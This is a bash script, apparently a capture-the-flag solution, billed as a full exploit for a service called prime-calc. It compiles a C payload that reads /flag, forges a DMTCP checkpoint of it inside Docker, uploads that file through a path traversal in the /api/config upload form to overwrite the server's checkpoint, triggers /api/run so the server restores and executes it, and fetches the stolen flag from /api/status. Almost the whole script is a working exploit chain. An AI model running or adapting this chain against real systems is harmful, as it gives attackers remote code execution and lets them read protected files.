#!/usr/bin/env bash
# Full self-contained exploit for prime-calc. RUN THIS ON A NORMAL LINUX HOST
# WITH DOCKER (NOT WSL2 — the checkpoint must be built on a kernel compatible
# with the remote, which is the whole "sensitive to machine differences" point).
#
# Usage:  ./pwn_from_linux.sh https://HOST
#
# It: builds a python:3.13-slim + DMTCP 4.2.0 image, forges a checkpoint of a
# payload that reads /flag -> /app/data/output/latest.txt, then uploads it over
# the /api/config path traversal (overwriting /app/data/checkpoint.dmtcp) and
# triggers /api/run so dmtcp_restart executes it as user `prime`.
set -euo pipefail
URL="${1:?usage: ./pwn_from_linux.sh https://HOST}"
WORK="$(mktemp -d)"; cd "$WORK"

cat > payload.c <<'EOF'
#include <stdio.h>
#include <unistd.h>
int main(void){
  for(;;){
    FILE*f=fopen("/flag","r");
    if(f){char b[1024];size_t n=fread(b,1,sizeof b-1,f);fclose(f);
      if(n){FILE*o=fopen("/app/data/output/latest.txt","w");
        if(o){fwrite("PWNED ",1,6,o);fwrite(b,1,n,o);fclose(o);}}}
    usleep(100000);
  }
}
EOF

cat > Dockerfile <<'EOF'
FROM python:3.13-slim AS b
RUN apt-get update && apt-get install -y --no-install-recommends ca-certificates curl gcc g++ make libc6-dev && rm -rf /var/lib/apt/lists/*
RUN curl -fsSL https://github.com/dmtcp/dmtcp/archive/refs/tags/v4.2.0.tar.gz -o /tmp/d.tgz \
 && mkdir /tmp/d && tar -xzf /tmp/d.tgz -C /tmp/d --strip-components=1 \
 && cd /tmp/d && ./configure --prefix=/opt/dmtcp && make -j"$(nproc)" && make install
FROM python:3.13-slim
RUN apt-get update && apt-get install -y --no-install-recommends gzip libatomic1 libstdc++6 gcc libc6-dev && rm -rf /var/lib/apt/lists/*
COPY --from=b /opt/dmtcp /opt/dmtcp
ENV PATH=/opt/dmtcp/bin:$PATH
COPY payload.c /payload.c
RUN gcc -O0 -o /payload /payload.c
CMD ["sh","-c","mkdir -p /out; dmtcp_launch --new-coordinator --coord-port 7779 --ckptdir /out --interval 0 /payload & sleep 3; dmtcp_command --coord-port 7779 --bcheckpoint; sleep 1; dmtcp_command --coord-port 7779 --quit 2>/dev/null||true; ls /out"]
EOF

echo "[*] building image (compiles DMTCP, a few min)..."
docker build -t pcbuild . >/dev/null
echo "[*] forging checkpoint..."
mkdir -p out
docker run --rm -v "$PWD/out:/out" pcbuild >/dev/null
CKPT="$(ls out/ckpt_payload_*.dmtcp | head -n1)"
echo "[*] checkpoint: $CKPT ($(stat -c%s "$CKPT") bytes)"

echo "[*] uploading (path traversal -> /app/data/checkpoint.dmtcp)..."
curl -sk -X POST "$URL/api/config" \
  -F 'timestamp=1/../../checkpoint.dmtcp' \
  -F "config=@$CKPT;filename=x.dmtcp;type=application/octet-stream" >/dev/null || true

echo "[*] triggering dmtcp_restart..."
curl -sk -X POST "$URL/api/run" >/dev/null || true
sleep 2
echo "[*] reading flag..."
curl -sk "$URL/api/status"; echo
